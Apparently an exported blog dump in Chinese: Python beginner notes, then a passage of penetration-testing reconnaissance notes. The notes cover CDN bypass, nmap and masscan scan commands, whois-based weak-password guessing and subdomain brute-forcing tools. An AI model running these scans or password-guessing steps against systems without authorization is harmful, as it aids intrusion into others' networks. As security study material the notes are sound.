class=\"line\">map(),reduce(),filter(),lambda,pprint(),...</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>多写爬虫，POC，sqlmaptamper，Bruteforce之类的脚本来熟练运用。</p>\n</li>\n<li>看项目写项目 <code>#TODO</code></li>\n</ol>\n<h1 id=\"学习管道\"><a href=\"#学习管道\" class=\"headerlink\" title=\"学习管道\"></a>学习管道</h1><p><a href=\"https://www.imooc.com/learn/317\" target=\"_blank\" rel=\"noopener\">https://www.imooc.com/learn/317</a> 慕课python进阶，可以动手的教程</p>\n<p><a href=\"http://www.runoob.com/python/python-100-examples.html\" target=\"_blank\" rel=\"noopener\">http://www.runoob.com/python/python-100-examples.html</a> python100例</p>\n<p><a href=\"https://wizardforcel.gitbooks.io/core-python-2e/content/\" target=\"_blank\" rel=\"noopener\">https://wizardforcel.gitbooks.io/core-python-2e/content/</a> Python 核心编程 第二版</p>\n<p><a href=\"https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000\" target=\"_blank\" rel=\"noopener\">https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000</a> 廖雪峰python3教程（比较深 偏向开发）</p>\n<p><a href=\"http://www.runoob.com/python\" target=\"_blank\" rel=\"noopener\">http://www.runoob.com/python</a> 菜鸟教程</p>\n<h1 id=\"查询管道\"><a href=\"#查询管道\" class=\"headerlink\" title=\"查询管道\"></a>查询管道</h1><p><code>help()</code>函数 #查看帮助</p>\n<p><a href=\"https://docs.python.org/3/\" target=\"_blank\" rel=\"noopener\">https://docs.python.org/3/</a> #官方文档 </p>\n<p><a href=\"http://www.pythondoc.com/pythontutorial3/index.html\" target=\"_blank\" rel=\"noopener\">http://www.pythondoc.com/pythontutorial3/index.html</a> #中文文档 </p>\n<p>其他的就是多google了</p>\n<h1 id=\"变量特点\"><a href=\"#变量特点\" class=\"headerlink\" title=\"变量特点\"></a>变量特点</h1><p>大小写敏感，强类型，不需要声明即可使用（赋值时加上小数点即可变为浮点型，）<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10/4 = 2</span><br><span class=\"line\"></span><br><span class=\"line\">10.0/4 = 2.5</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"数据类型\"><a href=\"#数据类型\" class=\"headerlink\" title=\"数据类型\"></a>数据类型</h1><p>list（列表）</p>\n<p>用<code>[]</code>来声明，特点是有序、动态（同一list中可以包含str，int，float，bool多种数据形式）<br><code>foo = [&#39;foo&#39;,100,Ture]</code></p>\n<p>tuple（元组）<br>用<code>()</code>来声明，与list的唯一区别是创建后不可修改。<br>注意：由于<code>()</code>也是规定的优先运算符号，所以创建单元素tuple时需要使用<code>(&quot;foo&quot;,)</code>多加一个<code>,</code>。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#列表生成式一例</span><br><span class=\"line\">print [a*100+b*10+a for a in range(1,10) for b in range(0,10) ]</span><br><span class=\"line\">#生成121，222，232诸如此类3位对称数的列表</span><br></pre></td></tr></table></figure></p>\n<p><strong>dict</strong>ionaries（字典）<br>用<code>{}</code>来声明，如字典其名，是key与value一一映射的数据类型。<br>特点是</p>\n<ol>\n<li>按key查找查找速度快，但占用内存大，与list正好相反。</li>\n<li><p>无序</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">d = &#123;</span><br><span class=\"line\">    &apos;Adam&apos;: 95,</span><br><span class=\"line\">    &apos;Lisa&apos;: 85,</span><br><span class=\"line\">    &apos;Bart&apos;: 59</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">print(d)</span><br><span class=\"line\">#&#123;&apos;Lisa&apos;: 85, &apos;Adam&apos;: 95, &apos;Bart&apos;: 59&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>key必须是不可变的数据类型，即不能是list。</p>\n</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">d = &#123;</span><br><span class=\"line\">    [&apos;a&apos;, &apos;b&apos;]: True</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">print(d)</span><br><span class=\"line\"></span><br><span class=\"line\">#TypeError: unhashable type: &apos;list&apos;</span><br></pre></td></tr></table></figure>\n<ol start=\"4\">\n<li>set(组、集合)<br>基本就是只有key没有value的dict，判断元素是否在set中，使用in操作符。<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s = set([&apos;Adam&apos;, &apos;Lisa&apos;, &apos;Paul&apos;])</span><br><span class=\"line\">L = [&apos;Adam&apos;, &apos;Lisa&apos;, &apos;Bart&apos;, &apos;Paul&apos;]</span><br><span class=\"line\">for name in L:</span><br><span class=\"line\">    if name in s:</span><br><span class=\"line\">        s.remove(name)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        s.add(name)</span><br><span class=\"line\">print s</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h1 id=\"条件判断和循环\"><a href=\"#条件判断和循环\" class=\"headerlink\" title=\"条件判断和循环\"></a>条件判断和循环</h1><p><strong>注意！判断语句后必须要有<code>:</code>，并且需要特别注意缩进！</strong></p>\n<p><code>if-elif-else</code>的多条件判断。</p>\n<p><code>for-in</code>的迭代遍历循环,可用于多重循环。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#记得提前声明的变量才可以+=</span><br><span class=\"line\">L = range(1,101)</span><br><span class=\"line\">sum = 0</span><br><span class=\"line\">for i in L:</span><br><span class=\"line\">    sum += i*i</span><br><span class=\"line\">print sum</span><br></pre></td></tr></table></figure></p>\n<p><code>while-continue-break</code>条件判断循环，利用break判断结束循环，continue判断跳过这次循环进行下一次循环。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sum = 0</span><br><span class=\"line\">x = 0</span><br><span class=\"line\">while True:</span><br><span class=\"line\">    x = x + 1</span><br><span class=\"line\">    if x &gt; 100:</span><br><span class=\"line\">        break</span><br><span class=\"line\">    if x%2 == 0:</span><br><span class=\"line\">        continue</span><br><span class=\"line\">    sum += x</span><br><span class=\"line\">print sum</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"切片\"><a href=\"#切片\" class=\"headerlink\" title=\"切片\"></a>切片</h1><p>对有序的数据类型（list,tuple）可以进行切片（slipe）操作：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 以下是pyhon2环境下的结果，因为py2中range()代表了一个List，py3中要使用list(range())才是一个List。</span><br><span class=\"line\">L = range(1, 101)</span><br><span class=\"line\"># 前10个数；</span><br><span class=\"line\"># 3的倍数；</span><br><span class=\"line\"># 不大于50的5的倍数。</span><br><span class=\"line\"># 最后10个数；</span><br><span class=\"line\"># 最后10个5的倍数。</span><br><span class=\"line\">print L[:10] #等同于L[0:10]</span><br><span class=\"line\">print L[2::3] </span><br><span class=\"line\">print L[4:50:5] </span><br><span class=\"line\">print L[-10:]</span><br><span class=\"line\">print L[-46::5]</span><br></pre></td></tr></table></figure></p>\n<p>对字符串的切片：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 利用切片操作完成仅首字母变成大写的自定义函数</span><br><span class=\"line\">def firstCharUpper(s):</span><br><span class=\"line\">    return s[:1].upper()+s[1:]</span><br><span class=\"line\"></span><br><span class=\"line\">print firstCharUpper(&apos;hello&apos;)</span><br><span class=\"line\">print firstCharUpper(&apos;sunday&apos;)</span><br><span class=\"line\">print firstCharUpper(&apos;september&apos;)</span><br><span class=\"line\">#Hello</span><br><span class=\"line\">#Sunday</span><br><span class=\"line\">#September</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"函数\"><a href=\"#函数\" class=\"headerlink\" title=\"函数\"></a>函数</h1><h2 id=\"函数特性\"><a href=\"#函数特性\" class=\"headerlink\" title=\"函数特性\"></a>函数特性</h2><ol>\n<li><p>python中自定义函数对全局变量的引用比较特殊。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sum = 0</span><br><span class=\"line\">def square_of_sum(L):</span><br><span class=\"line\">    for i in L:</span><br><span class=\"line\">        sum += i*i</span><br><span class=\"line\">    return sum</span><br><span class=\"line\">print square_of_sum([1, 2, 3, 4, 5])</span><br><span class=\"line\"># UnboundLocalError: local variable &apos;sum&apos; referenced before assignment （报错：本地变量sum在赋值之前被引用了</span><br><span class=\"line\"># 说明在def定义函数之前所进行赋值的sum其实没有被引用在def中</span><br><span class=\"line\"># 不推荐使用全局变量，如若真的要使用全局变量可参考下例示范</span><br><span class=\"line\">sum = 0</span><br><span class=\"line\">def square_of_sum(L):</span><br><span class=\"line\">    for i in L:</span><br><span class=\"line\">        global sum</span><br><span class=\"line\">        sum += i*i</span><br><span class=\"line\">    return sum</span><br><span class=\"line\">print square_of_sum([1, 2, 3, 4, 5])</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>在python函数的结果中返回多个值的时候其实就是返回了一个<code>tuple</code>元组。</p>\n</li>\n<li><p>递归函数：在函数内部，可以调用其他函数。如果一个函数在内部调用自身本身，这个函数就是递归函数。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">以经典的汉诺塔问题为例</span><br><span class=\"line\"># move(n, a, b, c)表示的是有n个盘子在a柱子上，将要移到b柱子上面去</span><br><span class=\"line\">def move(n, a, b, c):</span><br><span class=\"line\"># 如果a柱子上面只有一个盘子，则直接移到c柱子上面去并输出路径，结束递归</span><br><span class=\"line\">    if n == 1:  </span><br><span class=\"line\">        print a, &apos;--&gt;&apos;, c</span><br><span class=\"line\">        return</span><br><span class=\"line\"># 表示的是将n-1的盘子从a柱子上面移到b柱子上面去</span><br><span class=\"line\">    move(n-1, a, c, b)</span><br><span class=\"line\"># 输出最下面个盘子移从a移到c的路径</span><br><span class=\"line\">    print a, &apos;--&gt;&apos;, c</span><br><span class=\"line\"># 将b柱子上面的n-1个盘子移动到c柱子上面</span><br><span class=\"line\">    move(n-1, b, a, c)</span><br><span class=\"line\"></span><br><span class=\"line\">move(4, &apos;A&apos;, &apos;B&apos;, &apos;C&apos;)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>默认参数只能定义在必需参数的后面：</p>\n<figure class=\"highlight plain\"><figcaption><span>OK:</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def fn1(a, b=1, c=2):</span><br><span class=\"line\">    pass</span><br><span class=\"line\"># Error:</span><br><span class=\"line\">def fn2(a=1, b):</span><br><span class=\"line\">    pass</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"常用函数\"><a href=\"#常用函数\" class=\"headerlink\" title=\"常用函数\"></a>常用函数</h2><h3 id=\"map\"><a href=\"#map\" class=\"headerlink\" title=\"map()\"></a>map()</h3><p>高阶函数：map()将列表中的变量遍历并且一一传入第一个参数的函数中进行处理：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">求每个数的平方</span><br><span class=\"line\">def f(x):</span><br><span class=\"line\">    return x*x</span><br><span class=\"line\">print map(f, [1, 2, 3, 4, 5, 6, 7, 8, 9])</span><br><span class=\"line\">#[1, 4, 9, 16, 25, 36, 49, 64, 81]</span><br><span class=\"line\">#注意：map()函数不改变原有的 list，而是返回一个新的 list。</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"reduce\"><a href=\"#reduce\" class=\"headerlink\" title=\"reduce()\"></a>reduce()</h3><p>高阶函数：相当于传两个参数的map()<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#求乘积</span><br><span class=\"line\">def prod(x, y):</span><br><span class=\"line\">    return x*y</span><br><span class=\"line\">print reduce(prod, [2, 4, 5, 7, 12])</span><br><span class=\"line\">#3360</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"filter\"><a href=\"#filter\" class=\"headerlink\" title=\"filter()\"></a>filter()</h3><p>高阶函数：filter()，经常用于过滤作用，函数返回的bool为true则保留，为false则丢弃<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#只取1到100中能二次开根结果为整数的值</span><br><span class=\"line\">import math</span><br><span class=\"line\"></span><br><span class=\"line\">def is_sqr(x):</span><br><span class=\"line\">    return math.sqrt(x)%1==0</span><br><span class=\"line\"></span><br><span class=\"line\">print filter(is_sqr, range(1, 101))</span><br><span class=\"line\">#[1, 4, 9, 16, 25, 36, 49, 64, 81, 100]</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"匿名函数-lambda\"><a href=\"#匿名函数-lambda\" class=\"headerlink\" title=\"匿名函数 lambda\"></a>匿名函数 lambda</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#简化代码，可以不用专门去定义一些简单的自定义函数</span><br><span class=\"line\">def is_not_empty(s):</span><br><span class=\"line\">    return s and len(s.strip()) &gt; 0</span><br><span class=\"line\"></span><br><span class=\"line\">print filter(is_not_empty, [&apos;test&apos;, None, &apos;&apos;, &apos;str&apos;, &apos;  &apos;, &apos;END&apos;])</span><br><span class=\"line\">#以下代码作用相同</span><br><span class=\"line\">print filter(lambda s:s and len(s.strip())&gt;0, [&apos;test&apos;, None, &apos;&apos;, &apos;str&apos;, &apos;  &apos;, &apos;END&apos;])</span><br></pre></td></tr></table></figure>\n<h3 id=\"返回函数\"><a href=\"#返回函数\" class=\"headerlink\" title=\"返回函数\"></a>返回函数</h3><p>Python的函数不但可以返回int、str、list、dict等数据类型，还可以返回函数！<br>由于可以返回函数，我们在后续代码里就可以决定到底要不要调用该函数。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def calc_prod(lst):</span><br><span class=\"line\">    def lazy_prod():</span><br><span class=\"line\">        def f(x, y):</span><br><span class=\"line\">            return x * y</span><br><span class=\"line\">        return reduce(f, lst)</span><br><span class=\"line\">    return lazy_prod</span><br><span class=\"line\">f = calc_prod([1, 2, 3, 4])</span><br><span class=\"line\">print f() #适当的延迟调用 可以优化程序运行</span><br></pre></td></tr></table></figure></p>\n<p>###闭包</p>\n<p><a href=\"https://www.imooc.com/code/6059\" target=\"_blank\" rel=\"noopener\">https://www.imooc.com/code/6059</a> 大致就是返回函数不要引用任何循环变量，或者后续会发生变化的变量。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def count():</span><br><span class=\"line\">    fs = []</span><br><span class=\"line\">    for i in range(1, 4):</span><br><span class=\"line\">        def f(j=i):</span><br><span class=\"line\">            return j*j</span><br><span class=\"line\">        fs.append(f)</span><br><span class=\"line\">    return fs</span><br><span class=\"line\"></span><br><span class=\"line\">f1, f2, f3 = count()</span><br><span class=\"line\">print f1(), f2(), f3()</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"cmp\"><a href=\"#cmp\" class=\"headerlink\" title=\"cmp()\"></a>cmp()</h3><p>比较函数，如果x,y是字符串则比较ASCII码的大小<br>cmp(…)<br>    cmp(x, y) -&gt; integer</p>\n<pre><code>Return -1 if x&lt;y, 0 if x==y, 1 if x&gt;y.\n</code></pre><h3 id=\"sorted\"><a href=\"#sorted\" class=\"headerlink\" title=\"sorted()\"></a>sorted()</h3><p>依从小到大（如果其中有字符串则比较ASCII码）来对list进行排序的函数，也可以作为高阶函数使用，如下例子<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 对字符串排序时，有时候忽略大小写排序更符合习惯。请利用sorted()高阶函数，实现忽略大小写排序的算法。</span><br><span class=\"line\"></span><br><span class=\"line\"># 输入：[&apos;bob&apos;, &apos;about&apos;, &apos;Zoo&apos;, &apos;Credit&apos;]</span><br><span class=\"line\"># 输出：[&apos;about&apos;, &apos;bob&apos;, &apos;Credit&apos;, &apos;Zoo&apos;]</span><br><span class=\"line\">def cmp_ignore_case(s1, s2):</span><br><span class=\"line\">    return cmp(s1.lower(), s2.lower()) #返回1则将s1往后排</span><br><span class=\"line\"></span><br><span class=\"line\">print sorted([&apos;bob&apos;, &apos;about&apos;, &apos;Zoo&apos;, &apos;Credit&apos;], cmp_ignore_case)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"enumerate\"><a href=\"#enumerate\" class=\"headerlink\" title=\"enumerate()\"></a>enumerate()</h3><p>enumerate() 函数可以为list建立索引：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#[&apos;Adam&apos;, &apos;Lisa&apos;, &apos;Bart&apos;, &apos;Paul&apos;]</span><br><span class=\"line\">#经过enumerate()变成了类似：</span><br><span class=\"line\">#[(0, &apos;Adam&apos;), (1, &apos;Lisa&apos;), (2, &apos;Bart&apos;), (3, &apos;Paul&apos;)]</span><br><span class=\"line\"></span><br><span class=\"line\">L = [&apos;Adam&apos;, &apos;Lisa&apos;, &apos;Bart&apos;, &apos;Paul&apos;]</span><br><span class=\"line\">for index, name in enumerate(L):</span><br><span class=\"line\">     print index, &apos;-&apos;, name</span><br><span class=\"line\">... </span><br><span class=\"line\">0 - Adam</span><br><span class=\"line\">1 - Lisa</span><br><span class=\"line\">2 - Bart</span><br><span class=\"line\">3 - Paul</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"values-方法\"><a href=\"#values-方法\" class=\"headerlink\" title=\"values()方法\"></a>values()方法</h3><p>dict 对象有一个 values() 方法，这个方法把dict转换成一个包含所有value的list，这样，我们迭代的就是 dict的每一个 value：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">d = &#123; &apos;Adam&apos;: 95, &apos;Lisa&apos;: 85, &apos;Bart&apos;: 59 &#125;</span><br><span class=\"line\">print d.values()</span><br><span class=\"line\"># [85, 95, 59]</span><br><span class=\"line\">for v in d.values():</span><br><span class=\"line\">    print v</span><br><span class=\"line\"># 85</span><br><span class=\"line\"># 95</span><br><span class=\"line\"># 59</span><br></pre></td></tr></table></figure></p>\n"},{"title":"渗透测试备忘之信息收集","date":"2018-09-28T12:20:39.000Z","_content":"\n# 渗透测试备忘之信息收集 #\n\n整理收集一下渗透测试中信息收集的各种方式方法。\n\n个人把信息手机简单分类为域名相关、IP相关、敏感信息泄露相关三大类，但其实信息收集是一个错综复杂的过程，并不能真正的做分类，仅是为了便于文章书写整理，也不应该局限思维，很多方式方法都可以自由组合使用。\n\n其实社工应当也是很大的一类，但本文不过多讨论社工。\n## IP相关 ##\n\n### 绕过CDN获取真实IP ###\n\n现在大部分大站都使用CDN来快速响应大量用户的请求，在渗透大型网站过程中，拿到真实IP也是必须的，所以先来讨论一下获取真实IP的姿势。\n\n#### 判断是否开启CDN ####\n\nhttp://ping.chinaz.com/  站长之家\nhttps://ping.aizhan.com/  爱站网\n利用一些各地服务器ping同名域名，看各地解析IP是否一致即可判断是否开启CDN\n\nhttp://ipwhois.cnnic.net.cn/ 使用网信中心可以通过IP查到CNNIC及中国大陆的IP地址分配信息，可以确认公司的IP段，并且可以通过公司信息反查IP。\n\n#### 利用国外冷门DNS或子域名 ####\n\n很多网站为了节省资源使用并不会给国外的冷门DNS或者一些多级子域名做CDN，所以在这两方面可能可以直接获取真实IP。\n\n大部分国内网站的CDN都是对内使用的，如果使用国外冷门DNS服务器解析可能可以直接解析到真实IP,下附命令及国外一些DNS服务器:\n\n```\nnslookup http://foo.com 8.8.8.8\n\n/*\nGoogle Public DNS：8.8.8.8、8.8.4.4\n\nNorton DNS：198.153.192.1、198.153.194.1\n\nOpenDNS：208.67.222.222、208.67.220.220\n\nOpenDNS Family：208.67.222.123、208.67.220.123\n\nComodo Secure DNS：156.154.70.22、156.156.71.22\n\nScrubIt DNS：67.138.54.100、207.225.209.66\n\nDNS Advantage：156.154.70.1、156.154.71.1\n*/\n\n```\n#### RSS订阅、邮件订阅等 ####\n\n很多网站提供了RSS或者邮件订阅等服务，服务器向我们发送RSS或者邮件的时候就可以获取到真实的IP，或者同一网段的IP。\n\n#### 利用网络空间搜索器 ####\n\nhttps://fofa.so/ fofa比zoomeye和shodan好的地方就是可以搜索title语法，利用网站title信息来进行查询，成功率很高。\n\n#### 域名解析历史记录查询 ####\n\nhttps://www.virustotal.com/#/domain/foo.com\n\nhttps://toolbar.netcraft.com/site_report?url=foo.com\n\nhttps://x.threatbook.cn/ 微步也可以查到但是部分需要付费\n\n有些网站在使用CDN之前的IP解析也会被历史解析记录到可以试试。\n\n#### 网站自身漏洞泄露 ####\n\n像探针页面、phpinfo页面、或者利用诸如ssrf等漏洞远程访问自己的服务器。\n\n### C段扫描 ###\n\nC段扫描即因为通常情况下机房给予企业的外网IP都是在同一C段下连续的IP，所以可以对IP进行C段扫描看看是否有该目标的其他可突破IP。\n\n可以利用各种搜索引擎（IP为举例）：\ngoogle的`site:192.168.1.*`\nshodan的`net:192.168.1.0/24`\nzoomeyed的`cidr:192.168.1.0/24`\n\n也可以利用一些在线服务：\nhttps://www.5kik.com/c/\nhttp://www.webscan.cc/\n\n或者一些工具：\nhttp://www.91ri.org/7915.html\nhttp://www.7kb.org/817.html\n\n利用Nmap的（比较耗时且使用的是ping方式）\n`namp -sP ip/24 -oN c:\\ip.txt`\n扫描网站服务器c段，并且生成报告\n\n还有很多别的方式这里只是简单举例\n\n### 获得IP之后的端口扫描 ###\n\n中小型企业直接用神器nmap扫描就好，这里主要介绍一下对大型企业大量IP的端口扫描方案：\nmasscan+nmap，利用masscan号称6分钟扫遍全网端口的效率来简单扫描开放的端口，然后利用nmap再进行识别端口的详细扫描。\n相应的命令为`masscan XX.XXX.XX.XXX -p1-65535 --rate 1000`和`-sV -Pn --version-all -v -T4`其中-sV是端口识别；-Pn是跳过发现IP端口的过程，因为这个过程在之前由masscan完成了；--version-all是提高端口识别的准确度，保证对每个端口尝试每个探测报文；-v是使用细节模式提高详细度，可以输出扫描过程的更多信息；-T4，如果用于有足够的带宽或以太网连接，建议使用-T4选项，相对默认扫描能更快。\n接下来就是对端口扫描出来的结果分析利用了。\n\n## 域名相关 ##\n\n### whois ###\n\nhttps://whois.icann.org/en \n\nhttps://www.whois.net/ whois.net\n\nhttps://x.threatbook.cn/ 微步威胁情报查询\n\nhttp://whois.chinaz.com/ 站长之家\n\n可查询到注册人姓名、邮箱、注册地、电话、DNS服务器、注册公司信息等\n\n利用姿势：\n\n1. 对注册人姓名、邮箱、电话进行反查旁站及域名和IP的历史信息\n2. 对注册信息进行社工\n3. 针对以上信息制作弱口令 [猜密码](https://www.w0ai1uo.org/mima/)用于猜解密码\n\n### 网站备案号 ###\n\nhttp://icp.chinaz.com/ 站长之家\n\nhttp://www.miibeian.gov.cn/publish/query/indexFirst.action 工信部备案查询\n\n利用姿势：大中型企业的网络资产中，肯定远不止一个主域名，利用备案反查可以发现同一备案号下很多隐藏的域名。\n\n### SSL证书查询 ###\n\nhttps://censys.io/ \n\nhttps://crt.sh/\n\nhttps://myssl.com/\n\nhttps://www.chinassl.net/ssltools/ssl-checker.html\n\n利用姿势：一样是利用反查来查询隐藏的主域名。\n\n### 子域名、目录挖掘\n\n[子域名枚举备忘录](https://pentester.land/cheatsheets/2018/11/14/subdomains-enumeration-cheatsheet.html)\n\n#### 爬虫式扫描\n\n使用爬虫逐级遍历目录例如awvs的目录扫描以及burp的spider等工具\n\n#### 字典扫描\n\n字典扫描的重点还是在于字典\n\n目录扫描工具：\nhttps://github.com/Strikersb/webdirscan  王松写的目录扫描器\n御剑\n\n子域名扫描工具\nhttps://github.com/lijiejie/subDomainsBrute 高并发的DNS暴力枚举 优势在于速度快\nhttps://www.waitalone.cn/seay-layer-42.html Layer子域名挖掘机 优势在于可以探测端口、服务器信息、服务器状态\nhttps://phpinfo.me/domain/ 某大佬的在线子域名爆破|Domain fuzz\n\n\n#### 利用搜索引擎：\n\n常用google、bing，扫子域名的常用语法 `site:`，其中bing提供了API，很多子域名扫描机也是基于bing的API实现的，详情请见：[bing-web-search-api](https://azure.microsoft.com/en-us/services/cognitive-services/bing-web-search-api/)\n\n### 旁站查询 